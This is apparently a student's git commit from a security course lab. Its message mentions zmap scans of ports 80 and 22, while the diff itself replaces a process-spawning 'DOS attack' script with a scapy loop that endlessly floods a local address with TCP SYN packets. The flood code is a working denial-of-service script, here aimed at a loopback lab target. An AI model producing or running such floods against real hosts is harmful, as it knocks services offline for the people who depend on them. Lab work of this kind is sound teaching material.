444c7fee2e734387e6e938eb7b845d62b2c842ac
Lucy Zheng <lucy.zheng@utexas.edu>
2022-08-28 13:35:04 -0500

    Added zmap scans for port 80 and 22

--- lab1/dos.py
+++ lab1/dos.py
@@ -1,14 +1,5 @@
-import os
-import subprocess
+from scapy.all import *
 
-def create_client():
-#    os.system('./client')
-    subprocess.run('./client', shell=True)
-
-print('Starting DOS attack')
-
-for i in range(100):
-    create_client()
-
-print('Completed DOS attack')
-
+if __name__ == '__main__':
+    while True:
+        send(IP(dst='127.0.0.2', ttl=(1, 10))/TCP(dport=12000, flags='S'), inter=0.001)
